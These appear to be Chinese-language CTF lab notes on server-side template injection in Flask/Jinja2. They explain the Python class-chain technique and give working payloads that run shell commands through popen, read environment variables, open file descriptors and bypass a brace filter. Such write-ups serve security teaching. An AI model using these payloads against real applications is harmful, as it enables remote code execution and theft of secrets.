# web-ssti-flask
## ssti-flask-lab
### 关于ssti-flask：
- 由于代码漏洞产生，SSTI(Server-Side Template Injection)也就是服务器端模板注入，和其他如SQL注入、XSS注入等类似，是由于代码不严谨或不规范且信任了用户的输入而导致的。用户的输入在正常情况下应该作为普通的变量在模板中渲染，但SSTI在模板进行渲染时实现了语句的拼接，模板渲染得到的页面实际上包含了注入语句产生的结果。下面主要是以Jinja2为引擎的Flask模板的SSTI漏洞。Flask是一款使用python编写的模板。
- {{''.__class__.__base__.__subclasses__() }}这是一个探查class的模板payload，__class__是类中的一个内置属性，值是该实例的对应的类。这里使用的是''.__class__，得到的则是空字符串对应的类，也就是字符类。这样操作的意义是将我们现在操作的对象切换到类上面去，这样才能进行之后继承与被继承的操作，所以这里可以选用其他数据类型再来调用__class__属性，效果是一样的(例如[].__class__、{}.__class__、True.__class等)。_base__也是类中的一个内置属性，值当前类的父类，而在python中object是一切类最顶层的父类，也就是说我们可以过上一步获取到的类往上获取(一般数据类型的上一层父类中便有object)，最终便会获取到object，而由于object的特殊性，我们便能从object往下获取到其他所有的类，其中便有着能实现我们读取flag功能的类。(其他类似功能的还有__bases__、__mro__，但返回的数据包含类的元组，所以还需要下标选定object类) __subclasses__ ()是类中的一个内置方法，返回值是包含当前类所有子类的一个列表，通过上一步获取到的object我们实现了向下获取，接着我们需要在这些子类中获取合适的类
- {{''.__class__.__base__.__subclasses__()[xx].__init__.__globals__ }}_init__是类中的内置方法，在这个类实例化是自动被调用，但是返回值只能是None，且在调用是必须传入该类的实例对象。如果我们不去调用它，此时我们获得的是我们选取的类中的__init__这个函数。由于python一切皆对象的特性，函数本质上也是对象，也存在类中的一些内置方法和内置属性，所以我们可以执行接下来的操作。__globals__是函数中的一个内置属性，以字典的形式返回当前空间的全局变量，而其中就能找到我们需要的目标模块
- ''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__'] => 选中"__builtins__"模块，在这个模块中有很多我们常用的内置函数和类，其中就有eval函数。
- 思路一般是找类，找类的基类，找基类的子类，然后找可以RCE的模块，其中存在WAF过滤很多字符，需要自行进行替换。
#### ssti-flask-labs
##### level 1
- 这里可以通过构造一个代码来遍历得到我们需要的类下标，一般是寻找os._wrap_close这个类，这个类中有popen方法，我们去调用它；查看没有WAF限制，构造{{"".__class__.__bases__[0]. __subclasses__()[133].__init__.__globals__['popen']('cat flag').read()}}
- 这里还可以使用{{''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen('env').read()}}来注入；
##### level 2
- 这里过滤了{}，使用%print%来替代，构造{%print(().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('cat flag').read())%}
- 这里有看到{%print ''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen('env').read()%}这种注入，其中import是直接主动导入了os模块然后调用popen方法；
## ssti的常见的函数
```
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>
```